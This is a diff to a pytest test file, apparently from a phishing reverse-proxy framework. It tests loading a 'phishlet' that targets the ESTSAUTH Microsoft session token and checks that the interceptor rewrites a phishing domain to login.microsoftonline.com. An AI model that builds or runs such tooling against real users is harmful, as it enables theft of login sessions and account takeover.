@@ -48,22 +48,33 @@ def test_phishlet_loader():
     assert config.auth_tokens[0].name == "ESTSAUTH"
 
 @pytest.mark.skipif(http is None, reason="mitmproxy not installed")
-def test_interceptor_host_rewrite():
+@pytest.mark.asyncio
+async def test_interceptor_host_rewrite():
     # Setup
     loader = PhishletLoader()
     config = loader.load_from_yaml(SAMPLE_PHISHLET)
     session_mgr = SessionManager()
     interceptor = VantaInterceptor(config, session_mgr)
     
-    # Mock Flow
-    flow = MagicMock(spec=http.HTTPFlow if http else object)
-    # Ensure nested request object exists for spec'd mocks
-    flow.request = MagicMock()
-    flow.request.pretty_host = "login.phish-domain.com"
-    flow.request.method = "GET"
+    # Mock Flow - Use a simple object that can track attribute assignments
+    class MockRequest:
+        def __init__(self):
+            self.pretty_host = "login.phish-domain.com"
+            self.method = "GET"
+            self.headers = {}
+            self.cookies = {}
+            self.host = None  # This will be set by the interceptor
+            self.path = "/"  # Required by the interceptor
+    
+    class MockFlow:
+        def __init__(self):
+            self.request = MockRequest()
+            self.metadata = {}
+    
+    flow = MockFlow()
     
     # Execute Request Hook
-    interceptor.request(flow)
+    await interceptor.request(flow)
     
     # Assert Host Rewrite
     assert flow.request.host == "login.microsoftonline.com"
